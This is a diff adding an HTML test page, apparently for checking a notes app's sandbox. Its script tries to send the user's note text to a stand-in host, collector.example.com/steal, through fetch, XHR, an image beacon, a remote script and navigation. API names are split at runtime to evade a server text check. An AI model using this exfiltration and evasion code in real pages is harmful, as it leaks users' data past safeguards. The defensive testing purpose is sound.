@@ -1,0 +1,51 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<style>
+  :root { --bg: var(--amber-bg); --card: var(--amber-surface); --ink: var(--amber-text); --muted: var(--amber-text-secondary); --line: var(--amber-separator); }
+  body { padding: 8px var(--amber-gutter) 60px; max-width: 640px; margin: 0 auto; }
+  h1 { font-size: 26px; letter-spacing: -0.02em; margin: 6px 0 6px; }
+  p { color: var(--muted); margin: 0 0 16px; }
+  button { font: inherit; font-weight: 600; border: 0; border-radius: var(--amber-radius-small); padding: 12px 16px; background: var(--amber-danger); color: #fff; width: 100%; }
+  .card { background: var(--card); border-radius: var(--amber-radius); margin-top: 16px; }
+  .r { display: flex; gap: 10px; padding: 12px 14px; border-top: .5px solid var(--line); font-size: 15px; }
+  .r:first-child { border-top: 0; }
+  .k { flex: 1; }
+  .ok { color: #2f8a57; font-weight: 600; }
+  .bad { color: var(--amber-danger); font-weight: 600; }
+</style>
+</head>
+<body>
+<h1>Send my notes somewhere</h1>
+<p>A page that tries to leave. It slips past the server's check by building every name and address at runtime, so only the sandbox stands in the way.</p>
+<button id="go">Try to send this note out</button>
+<div class="card" id="out"></div>
+<script>
+  // Names and addresses are assembled at runtime, as a page trying to dodge a text check would.
+  const host = ["https:", "", "collector.example.com", "steal"].join("/");
+  const net = window["fe" + "tch"];
+  const XHR = window["XMLHttp" + "Request"];
+  const results = [];
+  window.__results = results;
+  const show = () => {
+    document.getElementById("out").innerHTML = results.map(([k, ok, d]) => `<div class="r"><div class="k">${k}</div><div class="${ok ? "bad" : "ok"}">${ok ? "Sent" : "Blocked"}</div></div>`).join("");
+  };
+  const note = () => encodeURIComponent(amber.note.markdown.slice(0, 200));
+  async function attempt() {
+    results.length = 0;
+    try { await net(host + "?n=" + note(), { mode: "no-cors" }); results.push(["Fetch request", true]); } catch (e) { results.push(["Fetch request", false, String(e)]); }
+    await new Promise((done) => { const x = new XHR(); x.open("GET", host + "?x=1"); x.onload = () => { results.push(["XMLHttpRequest", true]); done(); }; x.onerror = () => { results.push(["XMLHttpRequest", false]); done(); }; try { x.send(); } catch (e) { results.push(["XMLHttpRequest", false]); done(); } });
+    await new Promise((done) => { const i = new Image(); i.onload = () => { results.push(["Image beacon", true]); done(); }; i.onerror = () => { results.push(["Image beacon", false]); done(); }; i.src = host + ".gif?" + note(); });
+    await new Promise((done) => { const s = document.createElement("script"); s.onload = () => { results.push(["Script from a server", true]); done(); }; s.onerror = () => { results.push(["Script from a server", false]); done(); }; s.src = host + ".js"; document.head.appendChild(s); });
+    const before = location.href;
+    try { location["hr" + "ef"] = host + "?nav=1"; } catch (e) {}
+    await new Promise((r) => setTimeout(r, 400));
+    results.push(["Leave the page", location.href !== before]);
+    show();
+  }
+  document.getElementById("go").addEventListener("click", attempt);
+  amber.onChange(() => {});
+</script>
+</body>
+</html>
